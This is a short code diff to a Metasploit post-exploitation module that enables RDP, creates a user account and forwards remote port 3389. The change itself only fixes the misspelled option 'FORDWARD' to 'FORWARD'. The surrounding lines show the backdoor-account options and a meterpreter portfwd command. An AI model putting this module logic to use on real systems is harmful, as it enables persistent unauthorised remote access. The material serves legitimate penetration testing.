@@ -31,8 +31,8 @@ class Metasploit3 < Msf::Post
         OptString.new('USERNAME', [ false, 'The username of the user to create.' ]),
         OptString.new('PASSWORD', [ false, 'Password for the user created.' ]),
         OptBool.new(  'ENABLE',   [ false, 'Enable the RDP Service and Firewall Exception.', true]),
-        OptBool.new(  'FORDWARD', [ false, 'Forward remote port 3389 to local Port.', false]),
-        OptInt.new(   'LPORT',    [ false,  'Local port to fordward remote connection.', 3389])
+        OptBool.new(  'FORWARD', [ false, 'Forward remote port 3389 to local Port.', false]),
+        OptInt.new(   'LPORT',    [ false,  'Local port to forward remote connection.', 3389])
       ], self.class)
   end
 
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Post
           print_error("Insufficient privileges, account was not be created.")
         end
       end
-      if datastore['FORDWARD']
+      if datastore['FORWARD']
         print_status("Starting the port forwarding at local port #{datastore['LPORT']}")
         client.run_cmd("portfwd add -L 0.0.0.0 -l #{datastore['LPORT']} -p 3389 -r 127.0.0.1")
       end
